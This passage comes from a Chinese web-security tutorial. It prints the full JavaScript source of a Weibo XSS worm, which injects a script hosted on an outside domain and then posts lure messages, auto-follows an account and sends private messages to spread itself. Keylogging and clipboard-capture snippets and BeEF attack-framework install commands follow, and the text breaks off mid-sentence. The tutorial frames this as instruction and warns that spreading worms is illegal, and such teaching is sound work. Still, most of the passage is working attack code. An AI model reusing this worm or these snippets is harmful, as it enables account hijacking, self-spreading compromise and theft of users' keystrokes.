<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">ActiveXObject</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Microsoft.XMLHTTP&quot;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">getappkey</span><span style="color:#24292E;">(</span><span style="color:#E36209;">url</span><span style="color:#24292E;">){</span></span>
<span class="line"><span style="color:#24292E;">    xmlHttp </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">createXHR</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">    xmlHttp.</span><span style="color:#6F42C1;">open</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;GET&quot;</span><span style="color:#24292E;">,url,</span><span style="color:#005CC5;">false</span><span style="color:#24292E;">); </span><span style="color:#6A737D;">//获取 AppKey 不采用异步执行,等待请求返回 </span></span>
<span class="line"><span style="color:#24292E;">    xmlHttp.</span><span style="color:#6F42C1;">send</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">    result </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> xmlHttp.responseText;</span></span>
<span class="line"><span style="color:#24292E;">    id_arr </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 正则匹配出 AppKey 数组,包含每个被收听用户的 uid </span></span>
<span class="line"><span style="color:#24292E;">    id </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> result.</span><span style="color:#6F42C1;">match</span><span style="color:#24292E;">(</span><span style="color:#032F62;">/namecard=</span><span style="color:#22863A;font-weight:bold;">\\&quot;</span><span style="color:#032F62;">true</span><span style="color:#22863A;font-weight:bold;">\\&quot;</span><span style="color:#032F62;"> title=</span><span style="color:#22863A;font-weight:bold;">\\&quot;</span><span style="color:#005CC5;">[</span><span style="color:#D73A49;">^</span><span style="color:#22863A;font-weight:bold;">\\&quot;</span><span style="color:#005CC5;">]</span><span style="color:#D73A49;">*</span><span style="color:#032F62;">/</span><span style="color:#D73A49;">g</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">         </span><span style="color:#6F42C1;">https</span><span style="color:#24292E;">:</span><span style="color:#6A737D;">//beefproject.com/</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">for</span><span style="color:#24292E;">(i</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">;i</span><span style="color:#D73A49;">&lt;</span><span style="color:#24292E;">id.</span><span style="color:#005CC5;">length</span><span style="color:#24292E;">;i</span><span style="color:#D73A49;">++</span><span style="color:#24292E;">){</span></span>
<span class="line"><span style="color:#24292E;">        sum </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> id[i].</span><span style="color:#6F42C1;">toString</span><span style="color:#24292E;">().</span><span style="color:#6F42C1;">split</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;&quot;&#39;</span><span style="color:#24292E;">)[</span><span style="color:#005CC5;">3</span><span style="color:#24292E;">];  </span><span style="color:#6A737D;">//重新提取整理</span></span>
<span class="line"><span style="color:#24292E;">        id_arr </span><span style="color:#D73A49;">+=</span><span style="color:#24292E;"> sum </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;||&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> id_arr;</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">random_msg</span><span style="color:#24292E;">(){</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 使用短地址服务，构造 XSS 传播连接，隐藏自己的恶意 js 脚本，</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 这里正是 XSS 漏洞的触发位置</span></span>
<span class="line"><span style="color:#24292E;"> </span><span style="color:#6A737D;">//http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=upd</span></span>
<span class="line"><span style="color:#24292E;">    link </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39; http://163.fm/PxZHoxn?id=&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Date</span><span style="color:#24292E;">().</span><span style="color:#6F42C1;">getTime</span><span style="color:#24292E;">();;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 话题列表 </span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">var</span><span style="color:#24292E;"> msgs </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> [</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#032F62;">&#39;郭美美事件的一些未注意到的细节：&#39;</span><span style="color:#24292E;">,</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#032F62;">&#39;建党大业中穿帮的地方：&#39;</span><span style="color:#24292E;">,</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#032F62;">&#39;让女人心动的 100 句诗歌：&#39;</span><span style="color:#24292E;">,</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#032F62;">&#39;3D 肉团团高清普通话版种子：&#39;</span><span style="color:#24292E;">,</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#032F62;">&#39;这是传说中的神仙眷侣啊：&#39;</span><span style="color:#24292E;">,</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#032F62;">&#39;惊爆!范冰冰艳照真流出了：&#39;</span><span style="color:#24292E;">,</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#032F62;">&#39;杨幂被爆多次被潜规则:&#39;</span><span style="color:#24292E;">,</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#032F62;">&#39;傻仔拿锤子去抢银行：&#39;</span><span style="color:#24292E;">,</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#032F62;">&#39;可以监听别人手机的软件：&#39;</span><span style="color:#24292E;">,</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#032F62;">&#39;个税起征点有望提到 4000：&#39;</span><span style="color:#24292E;">]; </span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">//随机选取话题,加上之前的传播连接作为微博内容 </span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">var</span><span style="color:#24292E;"> msg </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> msgs[Math.</span><span style="color:#6F42C1;">floor</span><span style="color:#24292E;">(Math.</span><span style="color:#6F42C1;">random</span><span style="color:#24292E;">()</span><span style="color:#D73A49;">*</span><span style="color:#24292E;">msgs.</span><span style="color:#005CC5;">length</span><span style="color:#24292E;">)] </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> link;</span></span>
<span class="line"><span style="color:#24292E;">    msg </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">encodeURIComponent</span><span style="color:#24292E;">(msg); </span><span style="color:#6A737D;">//对内容进行 Url 编码</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> msg;</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#6A737D;">// 利用 Ajax 发送 POST 请求</span></span>
<span class="line"><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">post</span><span style="color:#24292E;">(</span><span style="color:#E36209;">url</span><span style="color:#24292E;">,</span><span style="color:#E36209;">data</span><span style="color:#24292E;">,</span><span style="color:#E36209;">sync</span><span style="color:#24292E;">){</span></span>
<span class="line"><span style="color:#24292E;">    xmlHttp </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">createXHR</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">    xmlHttp.</span><span style="color:#6F42C1;">open</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;POST&quot;</span><span style="color:#24292E;">,url,sync);</span></span>
<span class="line"><span style="color:#24292E;">    xmlHttp.</span><span style="color:#6F42C1;">setRequestHeader</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Accept&quot;</span><span style="color:#24292E;">,</span><span style="color:#032F62;">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">    xmlHttp.</span><span style="color:#6F42C1;">setRequestHeader</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Content-Type&quot;</span><span style="color:#24292E;">,</span><span style="color:#032F62;">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">    xmlHttp.</span><span style="color:#6F42C1;">send</span><span style="color:#24292E;">(data);</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#6A737D;">// 发表微博，话题随机</span></span>
<span class="line"><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">publish</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">    url </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;http://weibo.com/mblog/publish.php?rnd=&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Date</span><span style="color:#24292E;">().</span><span style="color:#6F42C1;">getTime</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">    data </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;content=&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">random_msg</span><span style="color:#24292E;">() </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&amp;pic=&amp;styleid=2&amp;retcode=&#39;</span><span style="color:#24292E;">; </span><span style="color:#6A737D;">//使用 random_msg 生成随机话题</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6F42C1;">post</span><span style="color:#24292E;">(url,data,</span><span style="color:#005CC5;">true</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#6A737D;">// 自动关注用户</span></span>
<span class="line"><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">follow</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">    url </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Date</span><span style="color:#24292E;">().</span><span style="color:#6F42C1;">getTime</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 使用当前页面存储的$CONFIG.$uid 构造自动关注数据包</span></span>
<span class="line"><span style="color:#24292E;">    data </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;uid=&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">2201270010</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&amp;fromuid=&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> $CONFIG.$uid </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&amp;refer_sort=profile&amp;atnId=profile&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6F42C1;">post</span><span style="color:#24292E;">(url,data,</span><span style="color:#005CC5;">true</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#6A737D;">// 发送私信</span></span>
<span class="line"><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">message</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">    url </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;http://weibo.com/&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> $CONFIG.$uid </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;/follow&#39;</span><span style="color:#24292E;">; </span><span style="color:#6A737D;">//构造用户关注用户列表页 Url</span></span>
<span class="line"><span style="color:#24292E;">    ids </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">getappkey</span><span style="color:#24292E;">(url); </span><span style="color:#6A737D;">//获取被关注用户的 Appkey 数组</span></span>
<span class="line"><span style="color:#24292E;">    id </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> ids.</span><span style="color:#6F42C1;">split</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;||&#39;</span><span style="color:#24292E;">); </span><span style="color:#6A737D;">//分割出每个被关注用户的 Appkey</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">for</span><span style="color:#24292E;">(i</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">;i</span><span style="color:#D73A49;">&lt;</span><span style="color:#24292E;">id.</span><span style="color:#005CC5;">length</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">-</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">&amp;</span><span style="color:#24292E;"> i</span><span style="color:#D73A49;">&lt;</span><span style="color:#005CC5;">5</span><span style="color:#24292E;">;i</span><span style="color:#D73A49;">++</span><span style="color:#24292E;">){</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6A737D;">//构造私信发送 Url</span></span>
<span class="line"><span style="color:#24292E;">        msgurl </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;http://weibo.com/message/addmsg.php?rnd=&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">Date</span><span style="color:#24292E;">().</span><span style="color:#6F42C1;">getTime</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">        msg </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">random_msg</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">        msg </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">encodeURIComponent</span><span style="color:#24292E;">(msg);</span></span>
<span class="line"><span style="color:#24292E;">        user </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">encodeURIComponent</span><span style="color:#24292E;">(</span><span style="color:#6F42C1;">encodeURIComponent</span><span style="color:#24292E;">(id[i]));</span></span>
<span class="line"><span style="color:#24292E;">        data </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;content=&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> msg </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&amp;name=&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> user </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&amp;retcode=&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6F42C1;">post</span><span style="color:#24292E;">(msgurl,data,</span><span style="color:#005CC5;">false</span><span style="color:#24292E;">);  </span><span style="color:#6A737D;">//通过 XmlHttpRequest 发送请求</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">function</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">main</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">try</span><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6F42C1;">publish</span><span style="color:#24292E;">(); </span><span style="color:#6A737D;">//模拟发表微博</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">catch</span><span style="color:#24292E;">(e){}</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">try</span><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6F42C1;">follow</span><span style="color:#24292E;">(); </span><span style="color:#6A737D;">//模拟关注用户</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">catch</span><span style="color:#24292E;">(e){}</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">try</span><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6F42C1;">message</span><span style="color:#24292E;">(); </span><span style="color:#6A737D;">//模拟发送私信</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">catch</span><span style="color:#24292E;">(e){}</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">try</span><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">//在当前 body 尾部插入存放在远端的 Xss 恶意脚本</span></span>
<span class="line"><span style="color:#24292E;">   x</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;g=document.createElement(&#39;script&#39;);g.src=&#39;http://www.2kt.cn/images/t.js&#39;;document.body.appendChild(g)&quot;</span><span style="color:#24292E;">;window.opener.</span><span style="color:#6F42C1;">eval</span><span style="color:#24292E;">(x);</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">catch</span><span style="color:#24292E;">(e){}</span></span>
<span class="line"><span style="color:#6F42C1;">main</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#D73A49;">var</span><span style="color:#24292E;"> t</span><span style="color:#D73A49;">=</span><span style="color:#6F42C1;">setTimeout</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;location=&quot;http://weibo.com/pub/topic&quot;;&#39;</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">5000</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#6A737D;">//等待 5 秒跳转到微话题页面</span></span></code></pre></div><p>我总结了该 XSS 蠕虫的攻击流程：</p><ol><li><p>利用 XSS 漏洞插入恶意 JS 代码；</p></li><li><p>利用 XMLHttpRequest 发送请求去发表微博、关注用户、获取关注者列表并向其发送私信；</p></li><li><p>微博消息和私信都包含有恶意攻击链接，等于实现了攻击代码的自我复制和传播。</p></li></ol><p>由此可见，一个完整的 XSS 蠕虫常常具备如下特征：</p><ul><li><p>目标网站存在 XSS 漏洞；</p></li><li><p>攻击代码的自我复制和传播，其传播方式依赖于业务场景，更多是在社交功能上，比如博客、私信、微博、评论。</p></li></ul><p><strong>声明：在互联网上传播 XSS 蠕虫属于违法行为，即使是处于合法的渗透测试任务，也该严格控制传播的可能性，否则出现失控，仍需承担法律责任</strong>。</p><h4 id="其他攻击方法" tabindex="-1">其他攻击方法 <a class="header-anchor" href="#其他攻击方法" aria-label="Permalink to &quot;其他攻击方法&quot;">​</a></h4><p>在 XSS 漏洞攻击场景下，凡是 JavaScript 能够实现功能，你都可以自由发挥，实现不同的攻击方法。</p><p>比如键盘记录：</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">keys </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">document.</span><span style="color:#B392F0;">onkeypress</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;">(){</span></span>
<span class="line"><span style="color:#E1E4E8;">  keys </span><span style="color:#F97583;">+=</span><span style="color:#E1E4E8;"> String.</span><span style="color:#B392F0;">fromCharCode</span><span style="color:#E1E4E8;">(window.event.keyCode);</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">keys </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&quot;</span></span>
<span class="line"><span style="color:#24292E;">document.</span><span style="color:#6F42C1;">onkeypress</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">function</span><span style="color:#24292E;">(){</span></span>
<span class="line"><span style="color:#24292E;">  keys </span><span style="color:#D73A49;">+=</span><span style="color:#24292E;"> String.</span><span style="color:#6F42C1;">fromCharCode</span><span style="color:#24292E;">(window.event.keyCode);</span></span>
<span class="line"><span style="color:#24292E;">}</span></span></code></pre></div><p>比如在 Chrome 浏览器中使用代码截获剪贴板内容：</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">document.</span><span style="color:#B392F0;">addEventListener</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;paste&#39;</span><span style="color:#E1E4E8;">, </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> (</span><span style="color:#FFAB70;">evt</span><span style="color:#E1E4E8;">) {</span></span>
<span class="line"><span style="color:#E1E4E8;">  clipdata </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> evt.clipboardData </span><span style="color:#F97583;">||</span><span style="color:#E1E4E8;"> window.clipboardData;</span></span>
<span class="line"><span style="color:#E1E4E8;">  console.</span><span style="color:#B392F0;">log</span><span style="color:#E1E4E8;">(clipdata.</span><span style="color:#B392F0;">getData</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;text/plain&#39;</span><span style="color:#E1E4E8;">));</span></span>
<span class="line"><span style="color:#E1E4E8;">});</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">document.</span><span style="color:#6F42C1;">addEventListener</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;paste&#39;</span><span style="color:#24292E;">, </span><span style="color:#D73A49;">function</span><span style="color:#24292E;"> (</span><span style="color:#E36209;">evt</span><span style="color:#24292E;">) {</span></span>
<span class="line"><span style="color:#24292E;">  clipdata </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> evt.clipboardData </span><span style="color:#D73A49;">||</span><span style="color:#24292E;"> window.clipboardData;</span></span>
<span class="line"><span style="color:#24292E;">  console.</span><span style="color:#6F42C1;">log</span><span style="color:#24292E;">(clipdata.</span><span style="color:#6F42C1;">getData</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;text/plain&#39;</span><span style="color:#24292E;">));</span></span>
<span class="line"><span style="color:#24292E;">});</span></span></code></pre></div>`,15),as=s("p",null,"图 23：截获剪贴内容",-1),ps=s("p",null,"比如钓鱼欺骗用户输入账号、密码：",-1),ls=l(`<p>图 24：利用 XSS 进行钓鱼欺骗</p><p>方法还有很多，因篇幅有限，这里不再赘述，你可以参考下面讲到的 XSS 攻击框架 BeEF，它在工具上集成了很多 XSS 攻击方式，可直接使用。</p><h4 id="beef" tabindex="-1">BeEF <a class="header-anchor" href="#beef" aria-label="Permalink to &quot;BeEF&quot;">​</a></h4><p>这里我要介绍一款非常著名的 XSS 攻击框架 <a href="https://beefproject.com/" target="_blank" rel="noreferrer">BeEF</a>，它支持 Docker 快速安装，可以从 GitHub 下载然后编译安装：</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#B392F0;">$</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">git</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">clone</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">https://github.com/beefproject/beef</span></span>
<span class="line"><span style="color:#B392F0;">$</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">cd</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">beef</span></span>
<span class="line"><span style="color:#B392F0;">$</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">sudo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">docker</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">build</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-t</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">beef</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">.</span></span>
<span class="line"><span style="color:#B392F0;">$</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">sudo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">docker</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">run</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-p</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">3000</span><span style="color:#9ECBFF;">:3000</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-p</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">6789</span><span style="color:#9ECBFF;">:6789</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-p</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">61985</span><span style="color:#9ECBFF;">:61985</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-p</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">61986</span><span style="color:#9ECBFF;">:61986</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">--name</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">beef</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">beef</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6F42C1;">$</span><span style="color:#24292E;"> </span><span style="color:#032F62;">git</span><span style="color:#24292E;"> </span><span style="color:#032F62;">clone</span><span style="color:#24292E;"> </span><span style="color:#032F62;">https://github.com/beefproject/beef</span></span>
<span class="line"><span style="color:#6F42C1;">$</span><span style="color:#24292E;"> </span><span style="color:#032F62;">cd</span><span style="color:#24292E;"> </span><span style="color:#032F62;">beef</span></span>
<span class="line"><span style="color:#6F42C1;">$</span><span style="color:#24292E;"> </span><span style="color:#032F62;">sudo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">docker</span><span style="color:#24292E;"> </span><span style="color:#032F62;">build</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-t</span><span style="color:#24292E;"> </span><span style="color:#032F62;">beef</span><span style="color:#24292E;"> </span><span style="color:#032F62;">.</span></span>
<span class="line"><span style="color:#6F42C1;">$</span><span style="color:#24292E;"> </span><span style="color:#032F62;">sudo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">docker</span><span style="color:#24292E;"> </span><span style="color:#032F62;">run</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-p</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">3000</span><span style="color:#032F62;">:3000</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-p</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">6789</span><span style="color:#032F62;">:6789</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-p</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">61985</span><span style="color:#032F62;">:61985</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-p</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">61986</span><span style="color:#032F62;">:61986</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">--name</span><span style="color:#24292E;"> </span><span style="color:#032F62;">beef</span><span style="color:#24292E;"> </span><span style="color:#032F62;">beef</span></span></code></pre></div><p>运行成功后，你会得到一个 hook.js 地址，这是利用 XSS 